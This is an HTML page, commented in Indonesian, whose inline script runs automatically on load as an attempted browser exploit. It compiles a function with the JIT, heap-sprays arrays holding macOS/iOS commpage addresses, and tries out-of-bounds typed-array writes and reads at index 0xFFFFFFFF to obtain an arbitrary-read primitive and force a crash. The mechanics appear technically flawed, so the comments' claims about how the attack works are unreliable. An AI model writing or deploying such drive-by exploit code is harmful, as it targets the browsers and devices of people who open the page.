<!DOCTYPE html>
<html>
<head>
    <title>Integer Overflow TypedArray Index Attack</title>
</head>
<body>

    <h1>TypedArray Integer Overflow (Index Confusion)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Integer Overflow Indexing...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const TARGET_VALUE = COMM_PAGE64_BASE_ADDRESS + BigInt("0x320"); // 64-bit value
        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); // 64-bit address
        
        const LOW_WORD_VALUE = Number(TARGET_VALUE & 0xFFFFFFFFn); 
        const HIGH_WORD_VALUE = Number(TARGET_VALUE >> 32n);
        const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);

        let startTime = performance.now();
        let payloadHolders = []; 
        let victimTypedArray = null;

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD (Untuk menimpa header atau data array lain) ---
        function sprayPayload() {
            log("Memulai Spraying Payload (Index Confusion)...", "log-spray");
            const SPRAY_COUNT = 3000;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                // Payload akan berisi TARGET_ADDRESS dan TARGET_VALUE
                payloadArray[0] = HIGH_WORD_ADDR; 
                payloadArray[1] = LOW_WORD_ADDR;
                payloadArray[2] = HIGH_WORD_VALUE; 
                payloadArray[3] = LOW_WORD_VALUE;
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI KRITIS: Pemicu Integer Overflow ---
        function overflow_function(arr, initial_offset) {
            // Mencegah JIT melihat batas akhir
            let loop_limit = arr.length * 2; 

            // Offset yang dirancang untuk menyebabkan signed/unsigned/truncation confusion
            let offset = initial_offset; 

            // Profiling loop (JIT mengoptimalkan pengecekan batas arr)
            for (let i = 0; i < 50; i++) {
                // Operasi yang rumit untuk membingungkan JIT
                offset = (offset + 1) * 2; 
                offset = offset / 2;
                if (offset > 0x7FFFFFFF) { // Memicu Signed Overflow (simulasi)
                    offset = 0;
                }
            }

            // --- Titik Kerentanan ---
            // Kita memaksa offset menjadi nilai 32-bit yang sangat besar (0xFFFFFFFF)
            // yang di C++ diinterpretasikan secara berbeda
            const signed_overflow_index = 0xFFFFFFFF; // -1 jika dilihat sebagai signed 32-bit
            
            // JIT yang optimis akan menghilangkan Bounds Check
            // Jika Signed Overflow Index (-1) diinterpretasikan sebagai index yang valid
            // atau nilai 0xFFFFFFFF digunakan sebagai offset yang sangat besar
            
            // Lakukan penulisan OOB (Type Confusion / Index Corruption)
            // Ini akan menimpa metadata array lain atau data spray kita
            arr[signed_overflow_index] = LOW_WORD_ADDR; // Menulis Commpage Address (Low)
            arr[signed_overflow_index + 1] = HIGH_WORD_ADDR; // Menulis Commpage Address (High)
            
            // Lakukan pembacaan OOB (Trigger Arbitrary Read)
            const OOB_READ_INDEX = signed_overflow_index + 2; 
            return arr[OOB_READ_INDEX];
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runOverflowAttack() {
            startTime = performance.now();
            log("Phase 1: Grooming dan Profiling JIT Function.", "log-init");

            // 1. Array Korban
            victimTypedArray = new Uint32Array(100); 

            // 2. Profiling (Memaksa kompilasi overflow_function)
            for (let i = 0; i < 10000; i++) {
                try {
                   overflow_function(victimTypedArray, 10);
                } catch(e) {}
            }
            log("Phase 2: overflow_function dikompilasi JIT.", "log-info");
            
            // 3. JIT Spray Agresif (Untuk menimpa lokasi yang dituju oleh OOB Write)
            sprayPayload(); 

            // 4. Trigger Final
            log("Phase 3: Memicu Integer Overflow dan Arbitrary Read...", "log-critical");
            
            try {
                // Panggil fungsi yang sudah dioptimalkan JIT
                const result = overflow_function(victimTypedArray, 10);
                
                // Jika berhasil, result adalah nilai 32-bit dari lokasi memori yang korup
                log(`Nilai OOB dibaca (32-bit): 0x${result.toString(16)}`, "log-critical");

                if (result === LOW_WORD_ADDR) {
                    log("SUCCESS: Arbitrary Read primitif (Low Word Commpage Address)!", "log-success");
                }
                
                // Trigger Arbitrary Read pada Commpage Address (untuk mendapatkan log)
                let crashFunction = new Function('a', `return a[${result}]`);
                crashFunction(new Array(10)); // Akan crash jika result adalah alamat Commpage

            } catch(e) {
                 log(`JS Exception: ${e.message} - Menunggu Crash OS (Arbitrary Read)...`, "log-critical");
            }
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian Integer Overflow Attack...';
            setTimeout(runOverflowAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Signed/Unsigned Index Confusion.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
    </style>
</body>
</html>
